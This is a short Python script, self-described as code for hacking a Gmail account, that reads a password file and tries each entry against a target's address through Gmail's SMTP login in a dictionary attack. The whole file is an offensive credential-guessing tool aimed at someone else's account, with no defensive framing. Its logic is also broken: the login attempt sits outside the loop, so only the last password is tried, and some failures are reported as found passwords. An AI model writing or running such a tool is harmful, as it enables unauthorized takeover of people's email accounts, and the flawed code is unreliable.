# coding : utf-8
# This is the code for hacking gmail account

import smtplib
#file_path = raw_input('Path of Password File :')
file_path = input('Path of Password File :')
passwfile = open(file_path, 'r')
pass_lst = passwfile.readlines()

def login():
    i = 0
    usr = input('What is the targets email address :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for passw in pass_lst:
        i = i + 1
        print(str(i) + '/' + str(len(pass_lst)))
    try:
        server.login(usr, passw)
        print('[+] Password Found: %s ' % passw)
    except smtplib.SMTPAuthenticationError as e:
        error = str(e)
        if error[14] == '<':
            print('[+] Password Found: %s ' % passw)
        else:
           print('[!] Password Incorrect: %s ' % passw)
login()
